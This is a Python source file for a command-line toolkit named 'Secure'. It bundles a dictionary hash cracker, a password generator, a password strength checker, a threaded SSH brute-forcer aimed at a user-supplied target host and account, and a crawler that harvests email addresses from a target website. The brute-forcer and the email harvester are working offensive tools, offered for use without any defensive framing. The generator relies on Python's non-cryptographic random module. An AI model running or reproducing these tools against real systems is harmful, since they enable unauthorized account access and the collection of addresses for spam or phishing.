import hashlib
import paramiko, sys, os
import threading, time
import termcolor
import random
import requests.exceptions
import urllib.parse
import re
import string
import getpass
from bs4 import BeautifulSoup
from collections import deque


print('''
..######..########..######..##.....##.########..########
.##....##.##.......##....##.##.....##.##.....##.##......
.##.......##.......##.......##.....##.##.....##.##......
..######..######...##.......##.....##.########..######..
.......##.##.......##.......##.....##.##...##...##......
.##....##.##.......##....##.##.....##.##....##..##......
..######..########..######...#######..##.....##.########
''')


print('''
Welcome to Secure. To get started, enter menu.
''')

# Hash Decrypter

def hash_decrypter():
    type_of_hash = str(input('Which type of hash would you like to bruteforce? '))
    file_path = str(input('Enter path to the password file to bruteforce with: '))
    hash_to_decrypt = str(input('Enter Hash Value To Bruteforce: '))

    with open(file_path, 'r') as file:
        for line in file.readlines():
            if type_of_hash == 'md5':
                hash_object = hashlib.md5(line.strip().encode())
                hashed_word = hash_object.hexdigest()
                if hashed_word == hash_to_decrypt:
                    print('Found MD5 Password: ' + line.strip())
                    return
            if type_of_hash == 'sha1':
                hash_object = hashlib.sha1(line.strip().encode())
                hashed_word = hash_object.hexdigest()
                if hashed_word == hash_to_decrypt:
                    print('Found SHA1 Password: ' + line.strip())
                    return
            if type_of_hash == 'sha224':
                hash_object = hashlib.sha224(line.strip().encode())
                hashed_word = hash_object.hexdigest()
                if hashed_word == hash_to_decrypt:
                    print('Found SHA224 Password: ' + line.strip())
                    return
            if type_of_hash == 'sha256':
                hash_object = hashlib.sha256(line.strip().encode())
                hashed_word = hash_object.hexdigest()
                if hashed_word == hash_to_decrypt:
                    print('Found SHA256 Password: ' + line.strip())
                    return
            if type_of_hash == 'sha384':
                hash_object = hashlib.sha384(line.strip().encode())
                hashed_word = hash_object.hexdigest()
                if hashed_word == hash_to_decrypt:
                    print('Found SHA384 Password: ' + line.strip())
                    return
            if type_of_hash == 'sha512':
                hash_object = hashlib.sha512(line.strip().encode())
                hashed_word = hash_object.hexdigest()
                if hashed_word == hash_to_decrypt:
                    print('Found SHA512 Password: ' + line.strip())
                    return
        print('The password could not be found by using this list')

# Password Generator

def generator():
    letters = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k',
               'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x',
               'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K',
               'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',
               'Y', 'Z']
    numbers = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
    symbols = ['!', '@', '#', '$', '%', '&', '(', ')', '{', '}', '*', '/', '+']

    nr_letters = int(input('How many letters would you like to use in your password? '))
    nr_symbols = int(input('How many symbols would you like to have? '))
    nr_numbers = int(input('How many numbers would you like to use? '))

    password_list = []

    for char in range(1, nr_letters + 1):
        password_list += random.choice(letters)

    for char in range(1, nr_symbols + 1):
        password_list += random.choice(symbols)

    for char in range(1, nr_numbers + 1):
        password_list += random.choice(numbers)

    random.shuffle(password_list)

    password = ""
    for char in password_list:
        password += char
    print(f"\nYour password is: {password}\n")

# Password Strength Checker

def checker():
    def check_password_strength():
        password = getpass.getpass('Enter the password: ')
        strength = 0
        remarks = ''
        lower_count = upper_count = num_count = wspace_count = special_count = 0

        for char in list(password):
            if char in string.ascii_lowercase:
                lower_count += 1
            elif char in string.ascii_uppercase:
                upper_count += 1
            elif char in string.digits:
                num_count += 1
            elif char == ' ':
                wspace_count += 1
            else:
                special_count += 1

        if lower_count >= 1:
            strength += 1
        if upper_count >= 1:
            strength += 1
        if num_count >= 1:
            strength += 1
        if wspace_count >= 1:
            strength += 1
        if special_count >= 1:
            strength += 1

        if strength == 1:
            remarks = ('That\'s a very bad password.'
                       ' Change it as soon as possible.')
        elif strength == 2:
            remarks = ('That\'s a weak password.'
                       ' You should consider using a tougher password.')
        elif strength == 3:
            remarks = 'Your password is okay, but it can be improved.'
        elif strength == 4:
            remarks = ('Your password is hard to guess.'
                       ' But you could make it even more secure.')
        elif strength == 5:
            remarks = ('Now that\'s one hell of a strong password!!!'
                       ' Hackers don\'t have a chance guessing that password!')

        print('Your password has:-')
        print(f'{lower_count} lowercase letters')
        print(f'{upper_count} uppercase letters')
        print(f'{num_count} digits')
        print(f'{wspace_count} whitespaces')
        print(f'{special_count} special characters')
        print(f'Password Score: {strength / 5}')
        print(f'Remarks: {remarks}')

    def check_pwd(another_pw=False):
        valid = False
        if another_pw:
            choice = input(
                'Do you want to check another password\'s strength (y/n): ')
        else:
            choice = input(
                'Do you want to check your password\'s strength (y/n): ')

        while not valid:
            if choice.lower() == 'y':
                return True
            elif choice.lower() == 'n':
                print('Exiting...')
                return False
            else:
                print('Invalid input...please try again. \n')

    if __name__ == '__main__':
        check_pw = check_pwd()
        while check_pw:
            check_password_strength()
            check_pw = check_pwd(True)

# SSH Brute forcer

def ssh():
    stop_flag = 0

    def ssh_connect(password):
        global stop_flag
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(host, port=22, username=username, password=password)
            stop_flag = 1
            print(termcolor.colored(f'[+] Found Password: {password}\n For account: {username}', 'red'))
        except:
            print(termcolor.colored(f'[-] Incorrect Login: {password}', 'green'))
        ssh.close()

    host = input('[*] Target Address: ')
    username = input('[*] SSH Username: ')
    # port_number = input('[*] Port number: ')
    input_file = input('[*] Passwords File: ')
    print('\n')

    if not os.path.exists(input_file):
        print('[!] That File/Path Doesnt Exist')
        sys.exit(1)

    print(f'* * * Starting Threaded SSH Bruteforce On: {host}  With Account: {username} * * *')

    with open(input_file, 'r') as file:
        for line in file.readlines():
            if stop_flag == 1:
                t.join()
                exit()
            password = line.strip()
            t = threading.Thread(target=ssh_connect, args=(password,))
            t.start()
            time.sleep(0.5)


# Email Collector

def email():
    user_url = str(input('[*] Enter target url to scan: '))
    urls = deque([user_url])

    scraped_urls = set()
    emails = set()

    count = 0
    try:
        while len(urls):
            count += 1
            if count == 100:
                break
            url = urls.popleft()
            scraped_urls.add(url)

            parts = urllib.parse.urlsplit(url)
            base_url = '{0.scheme}://{0.netloc}'.format(parts)

            path = url[:url.rfind('/') + 1] if '/' in parts.path else url

            print('[%d] Processing %s' % (count, url))
            try:
                response = requests.get(url)
            except (requests.exceptions.MissingSchema, requests.exceptions.ConnectionError):
                continue

            new_emails = set(re.findall(r"[a-z0-9\.\-+_]+@[a-z0-9\.\-+_]+\..[a-z]+", response.text, re.I))
            emails.update(new_emails)

            soup = BeautifulSoup(response.text, features="lxml")

            for anchor in soup.find_all("a"):
                link = anchor.attrs['href'] if 'href' in anchor.attrs else ''
                if link.startswith('/'):
                    link = base_url + link
                elif not link.startswith('href'):
                    link = path + link
                if not link in urls and not link in scraped_urls:
                    urls.append(link)
    except KeyboardInterrupt:
        print('[-] Closing')

    for mail in emails:
        print(mail)

try:
    while True:
        command = input('Secure: ')

        if command == 'help':
            print('''
            help    -->    Get help
            menu    -->    Show what's on the menu
            clear   -->    Clear the screen
            exit    -->    Exit the program
            ''')
        elif command == 'menu':
            print('''
            Select Program:
            ---------------
            1. Hash Decrypter
            2. Password Generator
            3. Password Strength Checker
            4. SSH Brute Forcer
            5. Email collector
            6. Back
            ''')
            while True:
                ans = input('Select a number: ')
                if ans == '1':
                    hash_decrypter()
                elif ans == '2':
                    generator()
                elif ans == '3':
                    checker()
                elif ans == '4':
                    ssh()
                elif ans == '5':
                    email()
                elif ans == '6':
                    break
                else:
                    print('This option does not exist')
        elif command == 'clear':
            os.system('clear')
        elif command == 'exit':
            print('Good bye')
            exit()
        else:
            print('This command does not exist, type help to get more information')
except KeyboardInterrupt:
    print("\n\n[-] Detected CTRL + C ..... Quitting\n")